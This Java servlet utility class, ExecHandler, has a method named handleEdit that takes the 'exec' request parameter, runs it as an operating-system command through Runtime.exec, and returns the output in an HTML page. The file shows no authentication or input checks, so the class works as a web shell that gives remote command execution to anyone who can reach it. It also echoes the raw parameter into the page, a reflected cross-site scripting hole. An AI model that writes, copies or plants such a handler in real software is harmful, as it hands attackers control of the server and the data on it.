package util.handler;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;

import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class ExecHandler {

	private static void printReader( InputStream is, PrintWriter pw ) throws IOException {
		BufferedReader ir = new BufferedReader( new InputStreamReader( is ) );
		pw.println("<p><textarea rows='40' cols='120'>");
		String line = ir.readLine();
		while ( line != null ) {
			pw.println( line );
			line = ir.readLine();
		}
		pw.println("</textarea></p>");
		ir.close();
	}
	
	public static void handleEdit( HttpServletRequest request, HttpServletResponse response, ServletContext context ) throws Exception {
		String exec = request.getParameter( "exec" );
		PrintWriter pw = Util.startHtml(response);
		pw.println("<html>");
		pw.println("<body>");
		pw.println("<p>Exec : '"+exec+"'</p>");
		Runtime rt = Runtime.getRuntime();
		Process p = rt.exec( exec );
		pw.println("<p>Output area</p>");
		InputStream is = p.getInputStream();
		printReader(is, pw);
		pw.println("<p>Error area</p>");
		InputStream es = p.getErrorStream();
		printReader(es, pw);
		
		pw.println("</body>");
		pw.println("</html>");
	}
	
}
